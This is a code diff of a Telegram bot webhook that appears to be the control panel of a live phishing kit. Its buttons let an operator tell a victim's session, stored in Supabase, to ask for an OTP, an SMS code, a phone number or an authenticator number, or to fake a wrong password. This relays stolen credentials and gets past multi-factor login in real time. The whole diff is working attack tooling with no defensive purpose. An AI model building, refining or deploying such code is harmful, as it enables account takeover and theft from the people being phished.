@@ -3,124 +3,122 @@ import { dbUpdate } from './_supabase.js';
 const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 
 const COMMAND_MAP = {
-  otp:       'otp_required',
-  sms:       'sms_code',
-  phone:     'phone_verification',
-  success:   'success',
-  incorrect: 'incorrect_password',
-  sua:       'sua',
+  otp: 'otp_required', sms: 'sms_code', phone: 'phone_verification',
+  success: 'success', incorrect: 'incorrect_password', sua: 'sua',
 };
 
 export const handler = async (event) => {
-  // Log absolutely everything about the incoming request
-  console.log('=== BOT-WEBHOOK CALLED ===');
-  console.log('Method:', event.httpMethod);
-  console.log('Headers:', JSON.stringify(event.headers));
-  console.log('Body:', event.body);
-  console.log('Body length:', event.body?.length);
+  if (event.httpMethod !== 'POST') return { statusCode: 200, body: 'ok' };
 
-  // Always return 200 immediately — Telegram needs this or it retries
-  // We process asynchronously so the response isn't delayed
-  const responsePromise = processUpdate(event);
-
-  // Wait for processing but don't let it block the 200 response
   try {
-    await responsePromise;
+    const update = JSON.parse(event.body || '{}');
+    console.log('bot-webhook update type:', Object.keys(update).join(', '));
+
+    if (update.callback_query) {
+      const cb     = update.callback_query;
+      const cbId   = cb.id;
+      const cbData = cb.data || '';
+      const msgId  = cb.message?.message_id;
+      const chatId = cb.message?.chat?.id;
+
+      console.log('callback_query:', cbData);
+
+      const match = cbData.match(/^([a-z]+\d*)_([a-f0-9]{32})$/);
+      if (!match) {
+        console.error('Regex failed:', cbData);
+        await answerCb(cbId, '⚠️ Invalid format');
+        return { statusCode: 200, body: 'ok' };
+      }
+
+      const action    = match[1];
+      const sessionId = match[2];
+
+      // Show number grid
+      if (action === 'np') {
+        if (msgId && chatId) await editKeyboard(chatId, msgId, buildNumberGrid(sessionId));
+        await answerCb(cbId, 'Select a number');
+        return { statusCode: 200, body: 'ok' };
+      }
+
+      // Back to original keyboard
+      if (action === 'back') {
+        if (msgId && chatId) await editKeyboard(chatId, msgId, buildOriginalKeyboard(sessionId));
+        await answerCb(cbId, '← Back');
+        return { statusCode: 200, body: 'ok' };
+      }
+
+      // Number selected (n1–n99)
+      if (/^n\d+$/.test(action)) {
+        const number = action.substring(1);
+        await dbUpdate('sessions', {
+          status: 'responded', response_type: `number_prompt:${number}`,
+          responded_at: new Date().toISOString(), last_update: new Date().toISOString(),
+        }, { id: sessionId });
+        if (msgId && chatId) await editKeyboard(chatId, msgId, buildOriginalKeyboard(sessionId));
+        console.log(`Session ${sessionId} → number_prompt:${number}`);
+        await answerCb(cbId, `✅ Number ${number} sent`);
+        return { statusCode: 200, body: 'ok' };
+      }
+
+      // Standard action
+      const responseType = COMMAND_MAP[action];
+      if (!responseType) {
+        console.error('Unknown action:', action);
+        await answerCb(cbId, '⚠️ Unknown action: ' + action);
+        return { statusCode: 200, body: 'ok' };
+      }
+
+      await dbUpdate('sessions', {
+        status: 'responded', response_type: responseType,
+        responded_at: new Date().toISOString(), last_update: new Date().toISOString(),
+      }, { id: sessionId });
+      console.log(`Session ${sessionId} → ${responseType}`);
+      await answerCb(cbId, `✅ ${action.charAt(0).toUpperCase() + action.slice(1)} triggered!`);
+    }
   } catch (e) {
-    console.error('Processing error:', e.message, e.stack);
+    console.error('bot-webhook error:', e.message);
   }
 
   return { statusCode: 200, body: 'ok' };
 };
 
-async function processUpdate(event) {
-  if (!event.body) {
-    console.log('ERROR: Empty body received');
-    return;
-  }
+function buildOriginalKeyboard(sessionId) {
+  return { inline_keyboard: [
+    [{ text:'🔑 OTP Prompt',    callback_data:`otp_${sessionId}` },     { text:'❌ Password Error', callback_data:`incorrect_${sessionId}` }],
+    [{ text:'📱 SMS Code',      callback_data:`sms_${sessionId}` },      { text:'📞 Phone Number',   callback_data:`phone_${sessionId}` }],
+    [{ text:'🔢 Number Prompt', callback_data:`np_${sessionId}` }],
+    [{ text:'✅ Success',       callback_data:`success_${sessionId}` },  { text:'⚠️ SUA',            callback_data:`sua_${sessionId}` }],
+  ]};
+}
 
-  let update;
+function buildNumberGrid(sessionId) {
+  const rows = [];
+  let row = [];
+  for (let i = 1; i <= 99; i++) {
+    row.push({ text: String(i), callback_data: `n${i}_${sessionId}` });
+    if (row.length === 8) { rows.push(row); row = []; }
+  }
+  if (row.length) rows.push(row);
+  rows.push([{ text: '← Back', callback_data: `back_${sessionId}` }]);
+  return { inline_keyboard: rows };
+}
+
+async function editKeyboard(chatId, messageId, reply_markup) {
   try {
-    update = JSON.parse(event.body);
-    console.log('Parsed update keys:', Object.keys(update).join(', '));
-    console.log('Full update:', JSON.stringify(update));
-  } catch (e) {
-    console.error('JSON parse error:', e.message);
-    console.error('Raw body was:', event.body);
-    return;
-  }
-
-  if (!update.callback_query) {
-    console.log('No callback_query in update. Update type keys:', Object.keys(update).join(', '));
-    return;
-  }
-
-  const cb     = update.callback_query;
-  const cbId   = cb.id;
-  const cbData = cb.data || '';
-
-  console.log('callback_query received');
-  console.log('cbId:', cbId);
-  console.log('cbData:', cbData);
-  console.log('from:', JSON.stringify(cb.from));
-
-  // Test regex match
-  const match = cbData.match(/^([a-z]+)_([a-f0-9]{32})$/);
-  console.log('Regex match result:', match ? 'MATCHED' : 'NO MATCH');
-
-  if (!match) {
-    console.error('Regex failed. cbData was:', JSON.stringify(cbData));
-    console.error('cbData length:', cbData.length);
-    console.error('cbData charCodes:', [...cbData].map(c => c.charCodeAt(0)).join(','));
-    await answerCb(cbId, '⚠️ Invalid format');
-    return;
-  }
-
-  const action       = match[1];
-  const sessionId    = match[2];
-  const responseType = COMMAND_MAP[action];
-
-  console.log('Action:', action);
-  console.log('SessionId:', sessionId);
-  console.log('ResponseType:', responseType);
-
-  if (!responseType) {
-    console.error('Unknown action:', action);
-    await answerCb(cbId, '⚠️ Unknown action: ' + action);
-    return;
-  }
-
-  // Update Supabase
-  console.log('Updating Supabase session:', sessionId, '→', responseType);
-  try {
-    await dbUpdate('sessions', {
-      status:        'responded',
-      response_type: responseType,
-      responded_at:  new Date().toISOString(),
-      last_update:   new Date().toISOString(),
-    }, { id: sessionId });
-    console.log('Supabase update SUCCESS');
-  } catch (e) {
-    console.error('Supabase update FAILED:', e.message);
-  }
-
-  // Acknowledge button tap
-  await answerCb(cbId, `✅ ${action.charAt(0).toUpperCase() + action.slice(1)} triggered!`);
-  console.log('=== BOT-WEBHOOK DONE ===');
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageReplyMarkup`, {
+      method: 'POST', headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: chatId, message_id: messageId, reply_markup }),
+      signal: AbortSignal.timeout(5000),
+    });
+  } catch (e) { console.error('editKeyboard error:', e.message); }
 }
 
 async function answerCb(cbId, text) {
   try {
-    console.log('Answering callback:', cbId, text);
-    const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
-      method:  'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body:    JSON.stringify({ callback_query_id: cbId, text }),
-      signal:  AbortSignal.timeout(5000),
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
+      method: 'POST', headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ callback_query_id: cbId, text }),
+      signal: AbortSignal.timeout(5000),
     });
-    const j = await r.json();
-    console.log('answerCallbackQuery result:', JSON.stringify(j));
-  } catch (e) {
-    console.error('answerCb error:', e.message);
-  }
+  } catch (e) { console.error('answerCb error:', e.message); }
 }
